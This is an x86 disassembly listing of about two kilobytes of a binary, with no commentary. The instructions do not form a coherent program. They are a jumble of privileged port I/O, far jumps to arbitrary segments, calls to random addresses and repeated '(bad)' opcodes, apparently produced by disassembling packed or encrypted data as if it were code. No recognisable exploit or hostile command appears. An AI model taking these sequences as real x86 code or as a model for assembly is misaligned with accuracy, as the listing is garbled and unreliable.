  4140a4:	push   edx
  4140a5:	xchg   ecx,eax
  4140a6:	sti    
  4140a7:	fisub  WORD PTR [esi]
  4140a9:	int    0x2c
  4140ab:	iret   
  4140ac:	jmp    0x805f:0x4e6dfb72
  4140b3:	mov    ecx,0x422cf3e0
  4140b8:	xchg   edi,eax
  4140b9:	in     al,dx
  4140ba:	or     al,0xed
  4140bc:	daa    
  4140bd:	fcmovnb st,st(7)
  4140bf:	lea    eax,ds:0x5c312db8
  4140c5:	mov    bh,0xc1
  4140c7:	call   0xc0abb053
  4140cc:	ja     0x414120
  4140ce:	jmp    0x41407e
  4140d0:	fisttp WORD PTR [ebx+0x2d4e0c42]
  4140d6:	sahf   
  4140d7:	dec    esi
  4140d8:	mov    ds:0x7e7b6aad,al
  4140dd:	fs push ss
  4140df:	ja     0x41414f
  4140e1:	xor    DWORD PTR [eax+0x69],esi
  4140e4:	stos   BYTE PTR es:[edi],al
  4140e5:	fbld   TBYTE PTR [ebx-0x4c]
  4140e8:	and    dh,BYTE PTR [ebx+0x77]
  4140eb:	loopne 0x4140bd
  4140ed:	and    eax,0x6b27bfe9
  4140f2:	lock mov edi,0x46542bd7
  4140f8:	shl    BYTE PTR [ebx+0x7ae2a743],1
  4140fe:	mov    bh,0x99
  414100:	or     dl,BYTE PTR [ecx-0x33e5c5e1]
  414106:	pop    ds
  414107:	mov    ecx,0x7443b603
  41410c:	cmp    al,0x21
  41410e:	repnz mov eax,ecx
  414111:	jmp    0x7ac3:0x5b40b62c
  414118:	hlt    
  414119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411a:	xor    bh,BYTE PTR [ecx-0x1d]
  41411d:	xchg   ch,dh
  41411f:	sahf   
  414120:	mov    WORD PTR [ecx],?
  414122:	es mov bl,0x49
  414125:	jnp    0x41416c
  414127:	add    al,0x3b
  414129:	mov    esi,0xe6a02704
  41412e:	inc    ecx
  41412f:	mov    WORD PTR [ecx-0x7d7a5d3c],ds
  414135:	test   al,0xf4
  414137:	sub    cl,dl
  414139:	and    BYTE PTR [edx-0x7fe9d618],cl
  41413f:	cmp    al,0x6c
  414141:	cdq    
  414142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414143:	call   0xa160ddb0
  414148:	ss stos BYTE PTR es:[edi],al
  41414a:	inc    ecx
  41414b:	cmp    al,0x28
  41414d:	xor    BYTE PTR [edx-0x45390c3a],ah
  414153:	xor    al,0x98
  414155:	add    ebp,DWORD PTR [esi]
  414157:	sbb    DWORD PTR [edi+0x27],0x77
  41415b:	jae    0x414154
  41415d:	sbb    eax,esi
  41415f:	stc    
  414160:	cld    
  414161:	lods   al,BYTE PTR ds:[esi]
  414162:	sti    
  414163:	sbb    ebx,esi
  414165:	push   ecx
  414166:	adc    al,BYTE PTR [edi-0x56238939]
  41416c:	popf   
  41416d:	mov    ebp,0xa6eaa583
  414172:	inc    edx
  414173:	outs   dx,BYTE PTR ds:[esi]
  414174:	es mov eax,0x49ef5b1
  41417a:	mov    edi,gs
  41417c:	adc    BYTE PTR [ecx],ah
  41417e:	popf   
  41417f:	mov    bh,0x40
  414181:	(bad)  
  414182:	(bad)  
  414183:	pop    ecx
  414184:	pop    edx
  414185:	ja     0x4141a8
  414187:	sub    esi,DWORD PTR [edx]
  414189:	adc    al,cl
  41418b:	(bad)  
  41418d:	mov    eax,ds:0x9aeddca7
  414192:	push   ebp
  414193:	dec    esi
  414194:	loop   0x41414c
  414196:	jbe    0x414139
  414198:	cmp    eax,0xd3f4b44a
  41419d:	repnz mov eax,ds:0xa49f1e18
  4141a3:	in     al,dx
  4141a4:	aam    0xce
  4141a6:	add    al,0x1a
  4141a8:	sub    BYTE PTR [esp+edi*4+0x34],0x78
  4141ad:	jbe    0x4141aa
  4141af:	push   ebx
  4141b0:	push   ss
  4141b1:	pusha  
  4141b2:	inc    esp
  4141b3:	and    al,0x89
  4141b5:	les    esp,FWORD PTR [edi+0x48864c2c]
  4141bb:	imul   ebx,DWORD PTR [ebp+0x6a],0x3e
  4141bf:	popf   
  4141c0:	inc    eax
  4141c1:	mov    al,ds:0xb93e9544
  4141c6:	dec    ecx
  4141c7:	retf   
  4141c8:	sbb    al,0xd2
  4141ca:	or     eax,0xa9d54035
  4141cf:	outs   dx,DWORD PTR ds:[esi]
  4141d0:	out    dx,eax
  4141d1:	les    edi,FWORD PTR [edi-0x23e05183]
  4141d7:	cmp    edx,ebx
  4141d9:	test   cl,ch
  4141db:	jge    0x41417d
  4141dd:	sbb    DWORD PTR [eax],eax
  4141df:	popf   
  4141e0:	je     0x414175
  4141e2:	imul   al
  4141e4:	push   0xfd411d5e
  4141e9:	push   ds
  4141ea:	sti    
  4141eb:	mov    edx,0x2e6f997e
  4141f0:	fcom   DWORD PTR [eax+0x22aaef89]
  4141f6:	jb     0x4141c0
  4141f8:	es scas al,BYTE PTR es:[edi]
  4141fa:	adc    ebp,DWORD PTR [edx-0x35]
  4141fd:	fcom   QWORD PTR [eax+ebx*2]
  414200:	dec    eax
  414201:	pop    ss
  414202:	xchg   DWORD PTR [esi+0x7c],ebx
  414205:	pop    ecx
  414206:	in     eax,dx
  414207:	popa   
  414208:	fld    DWORD PTR [esi+0x60b33bdf]
  41420e:	jb     0x414195
  414210:	mov    esp,0xb28ec733
  414215:	dec    ebx
  414216:	pop    ds
  414217:	addr16 push esi
  414219:	push   ebp
  41421a:	inc    edx
  41421b:	pop    eax
  41421c:	das    
  41421d:	xchg   BYTE PTR [edi-0xbc4aac5],ah
  414223:	and    ch,dl
  414225:	mov    ecx,0xed832ebe
  41422a:	pushf  
  41422b:	and    esp,DWORD PTR [ebp+0x4b]
  41422e:	(bad)
  414231:	loop   0x414276
  414233:	lods   eax,DWORD PTR ds:[esi]
  414234:	xchg   esp,eax
  414235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414236:	pop    ss
  414237:	das    
  414238:	mov    eax,DWORD PTR [ebx+0x40]
  41423b:	out    0xc4,eax
  41423d:	out    0x83,al
  41423f:	adc    dh,BYTE PTR [eax-0x44]
  414242:	lods   al,BYTE PTR ds:[esi]
  414243:	pushf  
  414244:	push   ebx
  414245:	and    DWORD PTR [ebx-0x4],0xffffffde
  414249:	adc    eax,0x45331978
  41424e:	jp     0x414270
  414250:	in     al,0xf1
  414252:	fstp   TBYTE PTR [edi]
  414254:	mov    edx,0x6a526478
  414259:	inc    eax
  41425a:	mov    ecx,0x48ce124
  41425f:	test   esp,esi
  414261:	adc    edx,DWORD PTR [ebx]
  414263:	icebp  
  414264:	les    edi,FWORD PTR [edx]
  414266:	mov    DWORD PTR [esp+ebx*2],edi
  414269:	sub    eax,0xccacab07
  41426e:	xor    eax,0x39d7aad0
  414273:	pushf  
  414274:	lods   eax,DWORD PTR ds:[esi]
  414275:	mov    ebp,0xb25a72be
  41427a:	ret    0x1692
  41427d:	pop    ds
  41427e:	bound  eax,QWORD PTR [ebx+0x5afc679c]
  414284:	cld    
  414285:	fdiv   QWORD PTR [eax]
  414287:	adc    ebp,esp
  414289:	das    
  41428a:	cmp    BYTE PTR [ebp+0x7d4540d5],al
  414290:	out    dx,al
  414291:	std    
  414292:	cdq    
  414293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414294:	in     ax,0x89
  414297:	and    DWORD PTR [edx+ebx*1-0x59a41d7f],edx
  41429e:	jbe    0x414281
  4142a0:	ds xor eax,0x28ee1291
  4142a6:	(bad)  
  4142a7:	fiadd  DWORD PTR ds:0x19e10ce6
  4142ad:	jg     0x41429c
  4142af:	push   esi
  4142b0:	int3   
  4142b1:	idiv   BYTE PTR [edx+0x9af827e]
  4142b7:	or     BYTE PTR [ecx],bh
  4142b9:	pop    ss
  4142ba:	inc    esp
  4142bb:	das    
  4142bc:	sub    BYTE PTR [esi-0x53],0x73
  4142c0:	pop    eax
  4142c1:	fdiv   QWORD PTR [ebx]
  4142c3:	stc    
  4142c4:	outs   dx,DWORD PTR ds:[esi]
  4142c5:	popf   
  4142c6:	fwait
  4142c7:	cmp    eax,0x974d6273
  4142cc:	int    0x30
  4142ce:	mov    ds:0xc2b643a2,al
  4142d3:	jmp    0x1a7213d9
  4142d8:	je     0x414353
  4142da:	bound  edx,QWORD PTR [ecx+0x6]
  4142dd:	sar    al,1
  4142df:	dec    esi
  4142e0:	jle    0x4142ae
  4142e2:	nop
  4142e3:	pop    esp
  4142e4:	mov    al,0xba
  4142e6:	xor    al,0x78
  4142e8:	adc    BYTE PTR [esi+0x31],ah
  4142eb:	ret    0x2d28
  4142ee:	cwde   
  4142ef:	test   al,0xfe
  4142f1:	sub    al,0x59
  4142f3:	pop    edx
  4142f4:	add    DWORD PTR [esi+0x724c781b],edi
  4142fa:	xor    DWORD PTR [ebx+0x75],0xfffffff3
  4142fe:	mov    esi,0x8c7e307d
  414303:	add    ax,0x6fc2
  414307:	test   DWORD PTR [ebx+0xf14356b],esp
  41430d:	cmp    edx,DWORD PTR [edx+0x11]
  414310:	sar    DWORD PTR [eax],1
  414312:	in     al,0xae
  414314:	outs   dx,DWORD PTR ds:[esi]
  414315:	jnp    0x41432d
  414317:	inc    ecx
  414318:	dec    edx
  414319:	jae    0x41431e
  41431b:	push   ss
  41431c:	imul   edi,DWORD PTR [eax-0x3f2e7612],0xffffff8a
  414323:	mul    DWORD PTR [eax]
  414325:	shr    DWORD PTR es:[edi+ebx*8-0x9],cl
  41432a:	nop
  41432b:	cmp    eax,0x967503d2
  414330:	fcom   QWORD PTR [ecx*8+0x62831d9c]
  414337:	movq   mm4,mm0
  41433a:	jge    0x4142d4
  41433c:	nop
  41433d:	mov    ch,dl
  41433f:	pusha  
  414340:	shl    ecx,0x49
  414343:	lock mov ds:0x27807f0d,al
  414349:	inc    esi
  41434a:	cli    
  41434b:	neg    DWORD PTR [edi-0x2a7df2d7]
  414351:	dec    ecx
  414352:	loopne 0x414351
  414354:	pop    ebx
  414355:	and    al,0x82
  414357:	std    
  414358:	sbb    BYTE PTR [ebx+0x4d],ch
  41435b:	pushf  
  41435c:	lea    ebp,[edi-0x6a9c5607]
  414362:	leave  
  414363:	xchg   edx,eax
  414364:	fsub   st(0),st
  414366:	adc    BYTE PTR [edx],ah
  414368:	in     eax,dx
  414369:	jb     0x41437d
  41436b:	es icebp 
  41436d:	xchg   esi,eax
  41436e:	imul   ebx,esp,0xb3356870
  414374:	mov    dh,0xcf
  414376:	fidivr WORD PTR [ebx-0x2]
  414379:	imul   ebx,DWORD PTR [esi-0x15fec7b4],0x68
  414380:	mov    bl,0x6e
  414382:	dec    ecx
  414383:	jae    0x41431e
  414385:	pushf  
  414386:	mov    ebp,0xc5c07fd9
  41438b:	daa    
  41438c:	xchg   ebp,eax
  41438d:	int    0xd3
  41438f:	inc    esp
  414391:	bnd je 0x414410
  414394:	pop    esp
  414395:	or     eax,0x84db6788
  41439a:	(bad)  
  41439b:	lock pop ebx
  41439d:	das    
  41439e:	ror    ebx,cl
  4143a0:	repz test BYTE PTR [esi-0x7ad10e42],0x81
  4143a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a9:	adc    al,0x75
  4143ab:	dec    ecx
  4143ac:	out    0xd,al
  4143ae:	cmp    eax,0xdb8097f
  4143b3:	retf   
  4143b4:	push   ebx
  4143b5:	and    esp,0xffffffd1
  4143b8:	(bad)  
  4143ba:	mov    ecx,0xa3e575b0
  4143bf:	push   edi
  4143c0:	imul   eax,DWORD PTR [ebp+0x5cffdc9],0xc2a73e7d
  4143ca:	mov    edi,0x49a7cc82
  4143cf:	push   es
  4143d0:	push   ds
  4143d1:	adc    eax,0x619438da
  4143d6:	outs   dx,BYTE PTR ds:[esi]
  4143d7:	in     al,dx
  4143d8:	cmp    bl,BYTE PTR [ecx+0x68]
  4143db:	aad    0xa8
  4143dd:	sub    DWORD PTR [esi],ebp
  4143df:	outs   dx,DWORD PTR ds:[esi]
  4143e0:	cmp    bl,bl
  4143e2:	pushf  
  4143e3:	xor    al,0x1f
  4143e5:	loope  0x41440f
  4143e7:	imul   esi,edx,0xd7e378cb
  4143ed:	or     DWORD PTR [ebp-0x3],esp
  4143f0:	lds    ebp,FWORD PTR [edi+0x5e42c140]
  4143f6:	jae    0x414470
  4143f8:	mov    bh,0xd6
  4143fa:	ins    DWORD PTR es:[edi],dx
  4143fb:	xchg   ecx,eax
  4143fc:	mov    ah,0x4f
  4143fe:	push   es
  4143ff:	and    al,0x3c
  414401:	and    edi,DWORD PTR [esi-0x1cf944a0]
  414407:	mov    ch,0xf0
  414409:	popa   
  41440a:	fbld   TBYTE PTR [edx+ebp*1-0x2a]
  41440e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41440f:	jo     0x414457
  414411:	imul   bl
  414413:	mov    ?,WORD PTR [ecx+0x42576a31]
  414419:	cmp    DWORD PTR [edi-0x1d2c9b05],ebx
  41441f:	push   cs
  414420:	mov    ecx,0x2399ab04
  414425:	fsubr  st(5),st
  414427:	fisttp WORD PTR [edx]
  414429:	jne    0x4144aa
  41442b:	pop    DWORD PTR [ecx-0x77be71bd]
  414431:	inc    esi
  414432:	(bad)  
  414433:	pushf  
  414434:	mov    ah,0x48
  414436:	mov    bl,al
  414438:	stc    
  414439:	rcl    DWORD PTR [edx-0x6e819e6a],1
  41443f:	xchg   DWORD PTR [ebp-0x64af9158],eax
  414445:	pop    esp
  414446:	and    BYTE PTR [esi],bh
  414448:	mov    al,ds:0xb82a9869
  41444d:	and    eax,0x52fe117f
  414452:	outs   dx,BYTE PTR ds:[esi]
  414453:	enter  0xedfe,0x44
  414457:	adc    al,0xf9
  414459:	out    dx,al
  41445a:	xchg   BYTE PTR [edi+0x79],cl
  41445d:	xor    bh,BYTE PTR [edi+edx*1]
  414460:	jp     0x414443
  414462:	imul   edx,edx,0xffffff99
  414465:	cli    
  414466:	dec    ecx
  414467:	or     DWORD PTR [ebp+0x1065d12],ebx
  41446d:	xor    eax,0xd1f031ab
  414472:	push   esp
  414473:	mov    ebx,0x77557fec
  414478:	cmp    esi,DWORD PTR [edx-0xa45834b]
  41447e:	push   cs
  41447f:	mov    ds:0xd725eb53,eax
  414484:	ficom  DWORD PTR [ebp+0x6402e225]
  41448a:	add    al,0xd3
  41448c:	adc    al,0xc6
  41448e:	std    
  41448f:	xchg   edx,eax
  414490:	cld    
  414491:	lock shr ah,1
  414494:	fmul   QWORD PTR [eax-0x577875b1]
  41449a:	push   ecx
  41449b:	jmp    0xd397:0x1f8eea57
  4144a2:	cmp    al,0x5
  4144a4:	xlat   BYTE PTR ds:[ebx]
  4144a5:	out    dx,eax
  4144a6:	cs mov esi,0x3d52bfec
  4144ac:	dec    esi
  4144ad:	lahf   
  4144ae:	retf   
  4144af:	fcomp  DWORD PTR [esi]
  4144b1:	jnp    0x414443
  4144b3:	sahf   
  4144b4:	pop    esp
  4144b5:	xchg   edi,eax
  4144b6:	iret   
  4144b7:	cmp    eax,0x692b81bd
  4144bc:	mov    ds:0x11420616,eax
  4144c1:	and    BYTE PTR [ebp-0x6bfc8629],bh
  4144c7:	mov    bh,0x62
  4144c9:	jp     0x414493
  4144cb:	jmp    0x4144ac
  4144cd:	sbb    BYTE PTR [ecx+0x6c],ch
  4144d0:	jne    0x4144a6
  4144d2:	int3   
  4144d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144d4:	xor    BYTE PTR [ecx-0x31],bh
  4144d7:	iret   
  4144d8:	push   es
  4144d9:	ficomp WORD PTR [eax+0x6d]
  4144dc:	mov    al,ds:0x4b5956f
  4144e1:	bound  ecx,QWORD PTR [ecx+0x754618eb]
  4144e7:	mov    ds,WORD PTR [edi+0x4c]
  4144ea:	(bad)  
  4144eb:	popf   
  4144ec:	enter  0xfa1e,0x87
  4144f0:	add    ebx,esi
  4144f2:	or     ebx,DWORD PTR [esi]
  4144f4:	mov    esp,0x87302552
  4144f9:	xchg   cl,dh
  4144fb:	add    DWORD PTR [ecx-0x78],0xcaeabee7
  414502:	adc    BYTE PTR [esi-0x2f1260d7],cl
  414508:	mov    eax,DWORD PTR [edi+0x70b446ba]
  41450e:	(bad)  
  41450f:	into   
  414510:	and    ebp,ebp
  414512:	cmp    BYTE PTR [esi],0x47
  414515:	xchg   DWORD PTR [edx-0x545d3987],ecx
  41451b:	mov    ch,0x73
  41451d:	push   esi
  41451e:	in     eax,0x9a
  414520:	ret    
  414521:	cmp    BYTE PTR [eax],dh
  414523:	mov    ?,edx
  414525:	cmp    eax,0xb0ac6ac4
  41452a:	loopne 0x414579
  41452c:	xor    ecx,edx
  41452e:	aaa    
  41452f:	mov    esp,0x40dec9a8
  414534:	inc    esp
  414535:	adc    edi,DWORD PTR [esi-0x73]
  414538:	push   0x3b
  41453a:	add    edi,DWORD PTR [ecx+0x56]
  41453d:	add    DWORD PTR [ebp-0x4d],0x36579b1c
  414544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414545:	ficomp DWORD PTR [ebx]
  414547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414548:	jecxz  0x414596
  41454a:	loop   0x414523
  41454c:	ds push eax
  41454e:	fsubrp st(7),st
  414550:	mov    ecx,0xe9955886
  414555:	shl    BYTE PTR [ebx],cl
  414557:	xor    eax,0x15ccdb0b
  41455c:	cmc    
  41455d:	push   esp
  41455e:	lock fbld TBYTE PTR [eax+edx*1-0x6d]
  414563:	jmp    0xad5a:0xa57dda2d
  41456a:	push   esi
  41456b:	fwait
  41456c:	mov    al,BYTE PTR ds:0x21f588e1
  414572:	sub    dh,BYTE PTR [eax+0x15]
  414575:	out    dx,eax
  414576:	rol    DWORD PTR [ebp-0x34e11460],0xcc
  41457d:	pop    es
  41457e:	xor    dx,cx
  414581:	in     al,dx
  414582:	jle    0x4145b7
  414584:	std    
  414585:	jnp    0x41450b
  414587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414588:	nop
  414589:	sub    ecx,DWORD PTR [ebx]
  41458b:	mov    dh,0x98
  41458d:	dec    edx
  41458e:	add    eax,0xf532bef8
  414593:	test   eax,0xe900823e
  414598:	pop    esi
  414599:	mov    ds:0x64353b6,al
  41459e:	lods   eax,DWORD PTR ds:[esi]
  41459f:	in     al,0x8d
  4145a1:	stc    
  4145a2:	push   ds
  4145a3:	push   ss
  4145a4:	shl    DWORD PTR [bp+di],0xcd
  4145a8:	imul   DWORD PTR [ebp*4-0x6f3cd491]
  4145af:	push   0x4f7db008
  4145b4:	inc    edx
  4145b5:	fdivr  QWORD PTR [ebx+ebx*1+0x71]
  4145b9:	pusha  
  4145ba:	out    0x0,eax
  4145bc:	mov    ebp,0xfefe4e63
  4145c1:	mov    al,ds:0x22c6e15a
  4145c6:	repz scas eax,DWORD PTR es:[edi]
  4145c8:	and    al,0x3e
  4145ca:	jle    0x4145dc
  4145cc:	js     0x414578
  4145ce:	jne    0x41461f
  4145d0:	mov    al,cs:0xebb12fdd
  4145d6:	pop    ecx
  4145d7:	jae    0x4145c5
  4145d9:	add    al,0x97
  4145db:	cld    
  4145dc:	cwde   
  4145dd:	outs   dx,BYTE PTR ds:[esi]
  4145de:	inc    ecx
  4145df:	and    BYTE PTR [esi-0x20],dh
  4145e2:	add    eax,0x76053ed3
  4145e7:	call   0x2966c305
  4145ec:	xchg   BYTE PTR [edi],bl
  4145ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ef:	xchg   ebp,eax
  4145f0:	popa   
  4145f1:	cmc    
  4145f2:	push   edx
  4145f3:	sub    DWORD PTR [ecx-0x4efc6371],edi
  4145f9:	nop
  4145fa:	dec    BYTE PTR ds:0xf0cab11d
  414600:	dec    ebx
  414601:	inc    ebp
  414602:	sar    DWORD PTR [ebx+eiz*1-0xc7cb18],cl
  414609:	fs dec ebp
  41460b:	in     al,dx
  41460c:	call   0x6a777c77
  414611:	cs xchg esi,eax
  414613:	and    al,0xdb
  414615:	ins    DWORD PTR es:[edi],dx
  414616:	xor    eax,0xe5417b21
  41461b:	fwait
  41461c:	ret    
  41461d:	cmp    al,BYTE PTR [edx+0x36]
  414620:	or     esi,esi
  414622:	outs   dx,DWORD PTR ds:[esi]
  414623:	jg     0x4145d3
  414625:	daa    
  414626:	pop    esp
  414627:	or     edi,edi
  414629:	lea    esi,ds:0x2ff595ab
  41462f:	pusha  
  414630:	in     eax,dx
  414631:	std    
  414632:	cld    
  414633:	jnp    0x414654
  414635:	add    BYTE PTR [ebx-0x4a],bh
  414638:	or     al,0x7c
  41463a:	sub    ch,BYTE PTR [eax]
  41463c:	pushf  
  41463d:	dec    edx
  41463e:	cli    
  41463f:	mov    ah,0xa3
  414641:	and    ecx,DWORD PTR [eax+0x3b]
  414644:	jo     0x41464e
  414646:	mov    BYTE PTR fs:[esi-0x577b942],bh
  41464d:	int    0xa8
  41464f:	cs inc ecx
  414651:	repz push ebx
  414653:	jp     0x414613
  414655:	jmp    0x4146c1
  414657:	(bad)  
  414658:	fnstsw WORD PTR [ecx-0x2c78059a]
  41465e:	jmp    0x4146a4
  414660:	aas    
  414661:	cmp    al,0xcf
  414663:	adc    eax,esp
  414665:	mov    edx,0x90fd5a03
  41466a:	je     0x414655
  41466c:	pushf  
  41466d:	mov    dh,0x81
  41466f:	popf   
  414670:	add    BYTE PTR [ebp-0x14c87d5c],ah
  414676:	scas   al,BYTE PTR es:[edi]
  414677:	pushf  
  414678:	leave  
  414679:	xchg   BYTE PTR [ecx-0x59],bh
  41467c:	inc    esi
  41467d:	ret    0x43a8
  414680:	ja     0x41468e
  414682:	in     eax,0x52
  414684:	push   ss
  414685:	sub    DWORD PTR [edx+0x22],eax
  414688:	repnz aam 0x84
  41468b:	repz inc ebx
  41468d:	adc    esp,DWORD PTR [eax]
  41468f:	push   0x77f2fbc1
  414694:	ss mov esi,0x4161821f
  41469a:	cmp    cl,bh
  41469c:	outs   dx,DWORD PTR ds:[esi]
  41469d:	xor    ebx,DWORD PTR [ebx]
  41469f:	jno    0x4146ed
  4146a1:	mov    ah,0xd2
  4146a3:	push   ecx
  4146a4:	into   
  4146a5:	cld    
  4146a6:	daa    
  4146a7:	stos   DWORD PTR es:[edi],eax
  4146a8:	pusha  
  4146a9:	add    BYTE PTR [esi],0xab
  4146ac:	daa    
  4146ad:	call   0xb0012106
  4146b2:	loop   0x414692
  4146b4:	test   DWORD PTR [eax],ebp
  4146b6:	ret    
  4146b7:	cwde   
  4146b8:	iret   
  4146b9:	cs inc esi
  4146bb:	jbe    0x4146e1
  4146bd:	pusha  
  4146be:	stos   BYTE PTR es:[edi],al
  4146bf:	(bad)  
  4146c0:	aas    
  4146c1:	jmp    0x639c:0xc8797b8f
  4146c8:	mov    ecx,0xa073874c
  4146cd:	retf   
  4146ce:	das    
  4146cf:	xor    al,0x8a
  4146d1:	or     eax,DWORD PTR [eax]
  4146d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146d4:	adc    BYTE PTR [eax+0x7ff0e9da],0xec
  4146db:	stos   BYTE PTR es:[edi],al
  4146dc:	adc    al,0x91
  4146de:	jmp    0xbe7b2942
  4146e3:	lea    ebp,[ebp-0x7c364d48]
  4146e9:	dec    ecx
  4146ea:	pop    ds
  4146eb:	and    esi,edx
  4146ed:	aaa    
  4146ee:	push   ebx
  4146ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f0:	mov    esp,0xde8ba9a1
  4146f5:	xchg   BYTE PTR [esi],cl
  4146f7:	jmp    0x41473a
  4146f9:	or     BYTE PTR [edx+0x42771e6c],al
  4146ff:	push   es
  414700:	push   cs
  414701:	js     0x4146fe
  414703:	sub    ecx,esi
  414705:	test   eax,0xf2e1aa45
  41470a:	(bad)  [edx+0x0]
  41470d:	adc    DWORD PTR [edx],eax
  41470f:	jecxz  0x4146d2
  414711:	cli    
  414712:	shl    BYTE PTR [ecx+0x66dae08b],0x27
  414719:	push   esi
  41471a:	mov    edx,0x6f896018
  41471f:	xchg   ebx,eax
  414720:	jb     0x414773
  414722:	adc    dh,BYTE PTR [edx+0x7dc39a7]
  414728:	vpmacsdql xmm2,xmm4,xmm2,xmm0
  41472e:	xor    DWORD PTR [edx],ecx
  414730:	mov    ch,0x35
  414732:	xor    dl,BYTE PTR [esi+0x7a]
  414735:	fild   QWORD PTR [edi-0x19]
  414738:	clc    
  414739:	ret    0xd172
  41473c:	test   al,0x4d
  41473e:	xor    eax,0x8b3d585c
  414743:	out    0xa1,al
  414745:	inc    esi
  414746:	je     0x4147b0
  414748:	or     BYTE PTR [ebx+0x34],ah
  41474b:	idiv   BYTE PTR [ebp+0x1f]
  41474e:	fisttp DWORD PTR [edx-0x80]
  414751:	push   cs
  414752:	jmp    0xaeea:0x8bc2ea59
  414759:	dec    eax
  41475a:	dec    edx
  41475b:	leave  
  41475c:	sbb    al,0x9
  41475e:	jg     0x414709
  414760:	pop    edi
  414761:	cli    
  414762:	jmp    0x414720
  414764:	dec    edi
  414765:	test   DWORD PTR [esi],edi
  414767:	mov    dh,0x1e
  414769:	jmp    0xc7a8817c
  41476e:	jmp    0x41474b
  414770:	int3   
  414771:	(bad)  
  414772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414773:	or     ebp,0xed6850a2
  414779:	mov    ?,WORD PTR [edx]
  41477b:	mov    al,ah
  41477d:	daa    
  41477e:	jnp    0x41474f
  414780:	call   0xf252bc44
  414785:	xchg   ebp,eax
  414786:	(bad)  
  414788:	lea    eax,[esp+ebx*8]
  41478b:	jne    0x4147b4
  41478d:	cmc    
  41478e:	dec    eax
  41478f:	pop    edx
  414790:	or     ch,cl
  414792:	fist   DWORD PTR [ebx]
  414794:	add    al,0x4d
  414796:	popa   
  414797:	dec    eax
  414798:	bound  edi,QWORD PTR ds:0xb34e08c8
  41479e:	ins    BYTE PTR es:[edi],dx
  41479f:	call   0x92981171
  4147a4:	div    cl
  4147a6:	cmp    ecx,edx
  4147a8:	xchg   esp,eax
  4147a9:	xchg   ebp,eax
  4147aa:	mov    ds:0xe1ea9944,al
  4147af:	mov    bl,0xe9
  4147b1:	jns    0x414780
  4147b3:	fs movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  4147b6:	fdiv   QWORD PTR [edi]
  4147b8:	pusha  
  4147b9:	push   cs
  4147ba:	ret    
  4147bb:	push   ecx
  4147bc:	sahf   
  4147bd:	mov    ds:0x2eb5fd9f,eax
  4147c2:	aad    0x26
  4147c4:	int3   
  4147c5:	jle    0x4147b0
  4147c7:	enter  0xfaee,0x18
  4147cb:	js     0x4147d6
  4147cd:	sub    eax,0xdc21c586
  4147d2:	ret    0x5152
  4147d5:	push   es
  4147d6:	xchg   esi,eax
  4147d7:	aam    0xfe
  4147d9:	(bad)  
  4147da:	cli    
  4147db:	ja     0x414806
  4147dd:	xchg   edx,ebx
  4147df:	xor    BYTE PTR [ebx+eax*1+0x2c2ea89e],bl
  4147e6:	lds    ebx,FWORD PTR [ecx+ebp*1]
  4147e9:	je     0x414801
  4147eb:	lahf   
  4147ec:	lahf   
  4147ed:	or     al,ch
  4147ef:	in     al,0x11
  4147f1:	mov    eax,0xf0e30816
  4147f6:	and    eax,0x23edc84
  4147fb:	sub    eax,0xd9a4e206
  414800:	mov    eax,ds:0xb5fcd2ec
  414805:	in     al,dx
  414806:	hlt    
  414807:	shr    dl,1
  414809:	xor    edi,DWORD PTR [eax+0x73]
  41480c:	lods   eax,DWORD PTR ds:[esi]
  41480d:	aaa    
  41480e:	add    eax,0x680d8e41
  414813:	and    bh,BYTE PTR [ecx-0x3ef91fbe]
  414819:	out    0x8e,al
  41481b:	add    al,0xf6
  41481d:	add    dl,BYTE PTR ss:[eax+ebp*8+0x1f]
  414822:	xor    cl,BYTE PTR [ecx-0x54]
  414825:	ficom  WORD PTR ds:0x45ea9c4c
  41482b:	sbb    bl,BYTE PTR [ecx]
  41482d:	or     ch,BYTE PTR [eax+0x2aed18dc]
  414833:	shl    bl,cl
  414835:	xchg   ebx,eax
  414836:	dec    ebx
  414837:	aad    0x4c
  414839:	push   ss
  41483a:	loope  0x414873
  41483c:	aaa    
  41483d:	scas   eax,DWORD PTR es:[edi]
  41483e:	and    ch,ah
  414840:	fdivr  DWORD PTR [eax+0x33]
  414843:	push   eax
  414844:	fucomp st(4)
  414846:	jp     0x4148bd
  414848:	jno    0x4147ec
  41484a:	call   0x37b2b261
  41484f:	int    0x7e
  414851:	mov    BYTE PTR [esp+eax*1],dl
  414854:	sub    esp,esp
  414856:	xchg   ebx,eax
  414857:	punpcklwd mm0,DWORD PTR [edx-0x20]
  41485b:	test   eax,0xe853c335
  414860:	push   ds
  414861:	mov    ch,0xc6
  414863:	les    esi,FWORD PTR [esi+0x292399a4]
  414869:	sbb    bh,BYTE PTR [ecx-0x7d04fdef]
  41486f:	imul   ebp,ecx,0x6d882618
  414875:	aaa    
  414876:	out    0x6b,al
  414878:	adc    al,0xac
  41487a:	xlat   BYTE PTR ds:[ebx]
  41487b:	mov    dl,0x77
  41487d:	fdivrp st(7),st
  41487f:	or     eax,0xf9463a53
  414884:	pusha  
  414885:	(bad)  
  414886:	push   cs
  414887:	push   ecx
  414888:	leave  
  414889:	arpl   WORD PTR [edi-0x19],si
  41488c:	cld    
  41488d:	rcl    edx,1
  41488f:	gs dec esi
  414891:	cld    
  414892:	int    0x59
  414894:	stos   DWORD PTR es:[edi],eax
  414895:	imul   edx,edx,0xfffffffd
  414898:	into   
  414899:	inc    ebp
  41489a:	jno    0x41484c
  41489c:	push   ds
  41489d:	icebp  
  41489e:	imul   ah
  4148a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148a1:	fcomp  QWORD PTR [esi]
  4148a3:	sbb    al,0xc0
